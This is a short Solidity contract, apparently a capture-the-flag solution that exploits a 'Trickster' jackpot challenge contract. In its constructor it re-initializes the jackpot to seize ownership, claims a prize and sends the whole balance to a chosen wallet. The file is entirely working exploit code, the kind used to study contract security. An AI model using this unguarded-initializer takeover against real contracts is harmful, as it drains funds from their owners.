// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Jackpot } from "eko/ChallengeTrickster.sol";

contract TricksterCracker {
  constructor(Jackpot jackpot, address payable wallet) {
    uint256 amount = address(jackpot).balance;
    jackpot.initialize(address(this));
    jackpot.claimPrize(amount / 2);
    wallet.transfer(amount);
  }
}
